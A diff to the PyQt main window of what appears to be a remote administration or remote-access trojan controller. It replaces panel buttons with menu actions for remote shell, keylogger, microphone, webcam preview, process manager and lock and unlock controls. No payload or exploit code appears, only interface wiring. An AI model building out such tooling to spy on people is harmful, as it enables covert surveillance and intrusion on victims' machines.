@@ -92,18 +92,18 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.current_sock = ''
 
         # disable panel buttons
-        self.remoteShellButton.setDisabled(True)
-        self.remoteExplorerButton.setDisabled(True)
-        self.remoteAudioButton.setDisabled(True)
-        self.remoteKeyloggerButton.setDisabled(True)
-        self.remoteProcessesButton.setDisabled(True)
-        self.remoteScriptingButton.setDisabled(True)
-        self.lockServerButton.setDisabled(True)
-        self.lockServerButton.setVisible(False)
-        self.quitServerButton.setDisabled(True)
-        self.unlockServerButton.setDisabled(True)
-        self.updatePreviewButton.setDisabled(True)
-        self.getWebcamButton.setDisabled(True)
+        self.actionRemote_Shell.setDisabled(True)
+        self.actionRemote_Explorer.setDisabled(True)
+        self.actionRemote_Microphone.setDisabled(True)
+        self.actionRemote_Keylogger.setDisabled(True)
+        self.actionRemote_Process_Manager.setDisabled(True)
+        self.actionRemote_Scripting.setDisabled(True)
+        self.actionDesktop_Preview.setDisabled(True)
+        self.actionWebcam_Preview.setDisabled(True)
+        self.actionLock_Server.setDisabled(True)
+        #self.lockServerButton.setVisible(False)
+        self.actionStop_Server.setDisabled(True)
+        self.actionUnlock_Server.setDisabled(True)
 
         # indexes for servers table
         self.index_of_ipAddress = 0
@@ -131,23 +131,23 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                      self.server_right_click_menu)
 
         # Triggers
-        self.startListenButton.clicked.connect(self.listen_start)
-        self.stopListenButton.clicked.connect(self.listen_stop)
-        self.clientSettingsButton.clicked.connect(self.run_settings)
+        self.actionStartListen_for_connections.triggered.connect(self.listen_start)
+        self.actionStopListen_for_connections.triggered.connect(self.listen_stop)
+        self.actionClient_Configuration.triggered.connect(self.run_settings)
 
         # Panel Triggers
-        self.updatePreviewButton.clicked.connect(self.get_desktop_preview)
-        self.getWebcamButton.clicked.connect(self.get_webcam_preview)
-        self.screenSaveButton.clicked.connect(self.save_preview)
-        self.unlockServerButton.clicked.connect(self.unlock_server)
-        self.lockServerButton.clicked.connect(self.lock_server)
-        self.quitServerButton.clicked.connect(self.lock_server)
-        self.remoteShellButton.clicked.connect(lambda: self.run_plugin('shellMode'))
-        self.remoteExplorerButton.clicked.connect(lambda: self.run_plugin('explorerMode'))
-        self.remoteAudioButton.clicked.connect(lambda: self.run_plugin('audioMode'))
-        self.remoteKeyloggerButton.clicked.connect(lambda: self.run_plugin('keyloggerMode'))
-        self.remoteScriptingButton.clicked.connect(lambda: self.run_plugin('scriptingMode'))
-        self.remoteProcessesButton.clicked.connect(lambda: self.run_plugin('processesMode'))
+        #self.updatePreviewButton.triggered.connect(self.get_desktop_preview)
+        #self.getWebcamButton.triggered.connect(self.get_webcam_preview)
+        #self.screenSaveButton.triggered.connect(self.save_preview)
+        self.actionUnlock_Server.triggered.connect(self.unlock_server)
+        self.actionLock_Server.triggered.connect(self.lock_server)
+        self.actionStop_Server.triggered.connect(self.lock_server)
+        self.actionRemote_Shell.triggered.connect(lambda: self.run_plugin('shellMode'))
+        self.actionRemote_Explorer.triggered.connect(lambda: self.run_plugin('explorerMode'))
+        self.actionRemote_Microphone.triggered.connect(lambda: self.run_plugin('audioMode'))
+        self.actionRemote_Keylogger.triggered.connect(lambda: self.run_plugin('keyloggerMode'))
+        self.actionRemote_Scripting.triggered.connect(lambda: self.run_plugin('scriptingMode'))
+        self.actionRemote_Process_Manager.triggered.connect(lambda: self.run_plugin('processesMode'))
 
         # menu triggers
         self.actionStartListen_for_connections.triggered.connect(self.listen_start)
@@ -180,18 +180,18 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             self.listenthread.start()
             self.statusLabel.setText('Online')
             self.statusLabel.setStyleSheet('color: lime; border: none; font: 8pt "MS Shell Dlg 2";')
-            self.startListenButton.setChecked(True)
-            self.stopListenButton.setChecked(False)
+            self.actionStartListen_for_connections.setChecked(True)
+            self.actionStopListen_for_connections.setChecked(False)
         else:
-            self.startListenButton.setChecked(True)
+            self.actionStartListen_for_connections.setChecked(True)
 
     # Stop Listen for Servers
     def listen_stop(self):
         if self.acceptthreadState:
             self.acceptthreadState = False
             self.serversTable.clearContents()
-            self.startListenButton.setChecked(False)
-            self.stopListenButton.setChecked(True)
+            self.actionStartListen_for_connections.setChecked(False)
+            self.actionStopListen_for_connections.setChecked(True)
             self.statusLabel.setText('Offline')
             self.statusLabel.setStyleSheet('color: #e74c3c; border: none; font: 8pt "MS Shell Dlg 2";')
             self.onlineStatus.setText('0')
@@ -202,7 +202,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             except:
                 pass
         else:
-            self.stopListenButton.setChecked(True)
+            self.actionStopListen_for_connections.setChecked(True)
 
         self.update_main_menu()
 
@@ -450,54 +450,54 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
     def update_main_menu(self):
         try:
             if self.serversTable.item(self.serversTable.currentRow(), self.index_of_lock).text() == 'LOCKED':
-                self.unlockServerButton.setVisible(True)
-                self.unlockServerButton.setDisabled(False)
-                self.updatePreviewButton.setDisabled(False)
+                #self.actionUnlock_Server.setVisible(True)
+                self.actionUnlock_Server.setDisabled(False)
+                self.actionDesktop_Preview.setDisabled(False)
                 server = self.current_server()
                 if self.socks[server]['webcamdevice'] != 'NoDevice':
-                    self.getWebcamButton.setDisabled(False)
+                    self.actionWebcam_Preview.setDisabled(False)
 
-                self.remoteExplorerButton.setDisabled(True)
-                self.remoteShellButton.setDisabled(True)
-                self.remoteAudioButton.setDisabled(True)
-                self.remoteKeyloggerButton.setDisabled(True)
-                self.remoteScriptingButton.setDisabled(True)
-                self.remoteProcessesButton.setDisabled(True)
-                self.lockServerButton.setVisible(False)
-                self.lockServerButton.setDisabled(True)
-                self.quitServerButton.setDisabled(True)
+                self.actionRemote_Shell.setDisabled(True)
+                self.actionRemote_Explorer.setDisabled(True)
+                self.actionRemote_Microphone.setDisabled(True)
+                self.actionRemote_Keylogger.setDisabled(True)
+                self.actionRemote_Scripting.setDisabled(True)
+                self.actionRemote_Process_Manager.setDisabled(True)
+                #self.actionLock_Server.setVisible(False)
+                self.actionLock_Server.setDisabled(True)
+                self.actionStop_Server.setDisabled(True)
             else:
-                self.remoteExplorerButton.setDisabled(False)
-                self.remoteShellButton.setDisabled(False)
+                self.actionRemote_Shell.setDisabled(False)
+                self.actionRemote_Explorer.setDisabled(False)
                 if self.has_microphone():
-                    self.remoteAudioButton.setDisabled(False)
-                self.remoteKeyloggerButton.setDisabled(False)
-                self.remoteScriptingButton.setDisabled(False)
-                self.remoteProcessesButton.setDisabled(False)
-                self.lockServerButton.setVisible(True)
-                self.lockServerButton.setDisabled(False)
-                self.quitServerButton.setDisabled(False)
-                self.unlockServerButton.setVisible(False)
-                self.unlockServerButton.setDisabled(True)
-                self.updatePreviewButton.setDisabled(False)
+                    self.actionRemote_Microphone.setDisabled(False)
+                self.actionRemote_Keylogger.setDisabled(False)
+                self.actionRemote_Scripting.setDisabled(False)
+                self.actionRemote_Process_Manager.setDisabled(False)
+                #self.actionLock_Server.setVisible(True)
+                self.actionLock_Server.setDisabled(False)
+                self.actionStop_Server.setDisabled(False)
+                #self.unlockServerButton.setVisible(False)
+                self.actionUnlock_Server.setDisabled(True)
+                self.actionDesktop_Preview.setDisabled(False)
                 server = self.current_server()
                 if self.socks[server]['webcamdevice'] != 'NoDevice':
-                    self.getWebcamButton.setDisabled(False)
+                    self.actionWebcam_Preview.setDisabled(False)
         except:
-            self.remoteExplorerButton.setDisabled(True)
-            self.remoteShellButton.setDisabled(True)
-            self.remoteAudioButton.setDisabled(True)
-            self.remoteKeyloggerButton.setDisabled(True)
-            self.remoteScriptingButton.setDisabled(True)
-            self.remoteProcessesButton.setDisabled(True)
-            self.lockServerButton.setVisible(False)
-            self.lockServerButton.setDisabled(True)
-            self.quitServerButton.setDisabled(True)
-            self.unlockServerButton.setVisible(True)
-            self.unlockServerButton.setDisabled(True)
-            self.updatePreviewButton.setDisabled(True)
-            self.getWebcamButton.setDisabled(True)
-            self.screenSaveButton.setDisabled(True)
+            self.actionRemote_Shell.setDisabled(True)
+            self.actionRemote_Explorer.setDisabled(True)
+            self.actionRemote_Keylogger.setDisabled(True)
+            self.actionRemote_Microphone.setDisabled(True)
+            self.actionRemote_Scripting.setDisabled(True)
+            self.actionRemote_Process_Manager.setDisabled(True)
+            #self.actionLock_Server.setVisible(False)
+            self.actionLock_Server.setDisabled(True)
+            self.actionStop_Server.setDisabled(True)
+            #self.unlockServerButton.setVisible(True)
+            self.actionUnlock_Server.setDisabled(True)
+            self.actionDesktop_Preview.setDisabled(True)
+            self.actionWebcam_Preview.setDisabled(True)
+            #self.screenSaveButton.setDisabled(True)
 
     def has_microphone(self):
         try:
@@ -518,7 +518,8 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
 
         if self.serversTable.selectedItems():
 
-            server_menu.addAction(QIcon(os.path.join(assets, 'unlock.png')), 'Set Alias', self.add_alias)
+            server_menu.addAction(QIcon(os.path.join(assets, 'add_alias.png')), 'Set Alias', self.add_alias)
+            server_menu.addSeparator()
 
             if self.serversTable.item(server_index, self.index_of_lock).text() == 'LOCKED':
                 server_menu.addAction(QIcon(os.path.join(assets, 'unlock.png')), 'Unlock Server', self.unlock_server)
